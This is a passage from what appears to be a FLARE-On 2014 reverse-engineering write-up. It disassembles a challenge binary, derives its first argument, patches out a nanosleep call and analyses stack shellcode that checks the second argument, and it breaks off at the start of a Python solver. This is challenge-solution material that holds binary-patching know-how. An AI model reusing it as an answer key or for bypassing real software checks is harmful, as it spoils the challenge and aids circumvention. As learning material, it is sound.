</span></span><span style=display:flex><span>.text:000000000043718<span style=color:#268bd2>B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rax</span>]       <span style=color:#586e75>; rax = arg1</span>
</span></span><span style=display:flex><span>.text:000000000043718<span style=color:#268bd2>E</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C8</span>], <span style=color:#2aa198>0FFFFFFFFFFFFFFFFh</span>
</span></span><span style=display:flex><span>.text:0000000000437199 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rdx</span>, <span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>.text:000000000043719<span style=color:#268bd2>C</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>A1</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rcx</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C8</span>]
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>A8</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rdi</span>, <span style=color:#b58900>rdx</span>        <span style=color:#586e75>; rdi = arg1</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>AB</span> <span style=color:#268bd2>repne</span> <span style=color:#268bd2>scasb</span>             <span style=color:#586e75>; strlen(arg1)</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>AD</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, <span style=color:#b58900>rcx</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>B0</span> <span style=color:#268bd2>not</span>     <span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>B3</span> <span style=color:#268bd2>sub</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>B7</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>rsi</span>, <span style=color:#b58900>rax</span>        <span style=color:#586e75>; check if counter &lt; 11</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>BA</span> <span style=color:#268bd2>setb</span>    <span style=color:#b58900>al</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>BD</span> <span style=color:#268bd2>test</span>    <span style=color:#b58900>al</span>, <span style=color:#b58900>al</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>BF</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>arg1_xor_0x56</span> <span style=color:#586e75>; if counter &lt; 11 jump to for</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:0000000000437149 <span style=color:#268bd2>for_arg1_xor_0x56</span>
</span></span><span style=display:flex><span>.text:0000000000437149 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>counter_?</span>]
</span></span><span style=display:flex><span>.text:000000000043714<span style=color:#268bd2>F</span> <span style=color:#268bd2>cdqe</span>
</span></span><span style=display:flex><span>.text:0000000000437151 <span style=color:#268bd2>add</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>arg1_2</span>]
</span></span><span style=display:flex><span>.text:0000000000437158 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>counter_?</span>]
</span></span><span style=display:flex><span>.text:000000000043715<span style=color:#268bd2>E</span> <span style=color:#268bd2>movsxd</span>  <span style=color:#b58900>rdx</span>, <span style=color:#b58900>edx</span>
</span></span><span style=display:flex><span>.text:0000000000437161 <span style=color:#268bd2>add</span>     <span style=color:#b58900>rdx</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>arg1_2</span>]
</span></span><span style=display:flex><span>.text:0000000000437168 <span style=color:#268bd2>movzx</span>   <span style=color:#b58900>edx</span>, <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rdx</span>]
</span></span><span style=display:flex><span>.text:000000000043716<span style=color:#268bd2>B</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>edx</span>, <span style=color:#2aa198>56h</span>             <span style=color:#586e75>; xor with 0x56</span>
</span></span><span style=display:flex><span>.text:000000000043716<span style=color:#268bd2>E</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>rax</span>], <span style=color:#b58900>dl</span>
</span></span><span style=display:flex><span>.text:0000000000437170 <span style=color:#268bd2>add</span>     [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>counter_?</span>], <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span><span style=color:#586e75>; jumps back to top</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>We see another <code>repne scasb</code>. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with <code>0x56</code>.</p><figure class=code><figcaption><span>loc_437177</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#719e07>for</span> (<span style=color:#dc322f>int</span> i<span style=color:#719e07>=</span><span style=color:#2aa198>0</span>; i<span style=color:#719e07>&lt;</span><span style=color:#2aa198>11</span> ; i<span style=color:#719e07>++</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  arg1[i] <span style=color:#719e07>=</span> arg1[i] <span style=color:#719e07>^</span> <span style=color:#2aa198>0x56</span>;
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>If the loop is done, the <code>jnz</code> in line 19 will not be triggered and we land somewhere else.</p><figure class=code><figcaption><span>Comparison</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>C1</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>arg1_2</span>] <span style=color:#586e75>; arg1 xor 0x56</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>C8</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, <span style=color:#2aa198>0Ah</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>CD</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esi</span>, <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aBngcgDebd</span> <span style=color:#586e75>; &#34;bngcg`debd&#34;</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>D2</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rdi</span>, <span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>D5</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_400370</span>       <span style=color:#586e75>; func(arg1 xor 0x56, hexlify(bngcg`debd) )</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>DA</span> <span style=color:#268bd2>test</span>    <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>         <span style=color:#586e75>; if function is successful, will return 0</span>
</span></span><span style=display:flex><span>.text:00000000004371<span style=color:#268bd2>DC</span> <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_4371F2</span> <span style=color:#586e75>; jumps if return value = 0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Application loads the string <code>bngcg`debd</code> and compares the result of <code>arg1 xor 0x56</code> with it. If both are equal, <code>jz</code> in line 7 will be taken.<br>We have already seen the transitive property of xor so we can calculate the correct value of first argument which is <code>4815162342</code>. We could also patch the <code>jz</code> to <code>jmp</code> and enter any 10 characters for argument one.</p><figure class=code><figcaption><span>First argument</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>arg1 xor <span style=color:#2aa198>0x56</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;bngcg`debd&#34;</span>
</span></span><span style=display:flex><span>arg1 <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;bngcg`debd&#34;</span> xor <span style=color:#2aa198>0x56</span>
</span></span><span style=display:flex><span>arg1 <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;4815162342&#34;</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction <code>mov cs:byte_729AC2, al</code>. At that address, there are bytes being written and they are in <code>base64</code>. I was stepping through until suddenly everything stopped and I saw that a <code>nanosleep</code> syscall was executed.</p><p><img src=/images/2014/flare/6-2.jpg alt=nanosleep title=nanosleep></p><p>I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and <a href=https://twitter.com/FireEye/status/496757071644487680 target=_blank rel="noreferrer noopener">sub_401164</a> was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).</p><figure class=code><figcaption><span>Checking argument 2</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC39C</span>  <span style=color:#586e75>; ---------------------------------------------------------------------------</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC39C</span>  <span style=color:#268bd2>loc_7FFF3A5AC39C</span>:
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC39C</span>  <span style=color:#268bd2>ror</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rax</span>], <span style=color:#2aa198>0F2h</span>            <span style=color:#586e75>; arg2[0] ror 0xF2 == 0x1B</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC39F</span>  <span style=color:#268bd2>cmp</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rax</span>], <span style=color:#2aa198>1Bh</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3A2</span>  <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_7FFF3A5AC3A6</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3A4</span>  <span style=color:#268bd2>jmp</span>     <span style=color:#b58900>rbx</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3A6</span>  <span style=color:#586e75>; ---------------------------------------------------------------------------</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3A6</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3A6</span>  <span style=color:#268bd2>loc_7FFF3A5AC3A6</span>:
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3A6</span>  <span style=color:#268bd2>add</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3AA</span>  <span style=color:#268bd2>xor</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rax</span>], <span style=color:#2aa198>40h</span>             <span style=color:#586e75>; arg2[1] xor 0x40 xor 0xF2 xor 0xB3 == 0x30</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3AD</span>  <span style=color:#268bd2>xor</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rax</span>], <span style=color:#2aa198>0F2h</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3B0</span>  <span style=color:#268bd2>xor</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rax</span>], <span style=color:#2aa198>0B3h</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3B3</span>  <span style=color:#268bd2>cmp</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>rax</span>], <span style=color:#2aa198>30h</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3B6</span>  <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_7FFF3A5AC3BA</span>
</span></span><span style=display:flex><span>[<span style=color:#268bd2>stack</span>]:<span style=color:#2aa198>00007</span><span style=color:#268bd2>FFF3A5AC3B8</span>  <span style=color:#268bd2>jmp</span>     <span style=color:#b58900>rbx</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>...</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example <code>arg2[0] ror 0xF2 must equal 0x1B</code>, otherwise <code>jz</code> will be called and application will terminate in <code>loc_7FFF3A5AC3A6</code>. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.</p><p>Python does not have <code>ror</code> and <code>rol</code> binary operators so I stole them from <a href=http://www.falatic.com/index.php/108/python-and-bitwise-rotation target=_blank rel="noreferrer noopener">here</a>.</p><figure class=code><figcaption><span>Second argument</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">70
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#586e75># rol and ror implementations taken from</span>
</span></span><span style=display:flex><span><span style=color:#586e75># http://www.falatic.com/index.php/108/python-and-bitwise-rotation</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># Rotate left: 0b1001 --&gt; 0b0011</span>
</span></span><span style=display:flex><span>rol <span style=color:#719e07>=</span> <span style=color:#719e07>lambda</span> val, r_bits, max_bits<span style=color:#719e07>=</span><span style=color:#2aa198>8</span>: \
</span></span><span style=display:flex><span>    (val <span style=color:#719e07>&lt;&lt;</span> r_bits<span style=color:#719e07>%</span>max_bits) <span style=color:#719e07>&amp;</span> (<span style=color:#2aa198>2</span><span style=color:#719e07>**</span>max_bits<span style=color:#719e07>-</span><span style=color:#2aa198>1</span>) <span style=color:#719e07>|</span> \
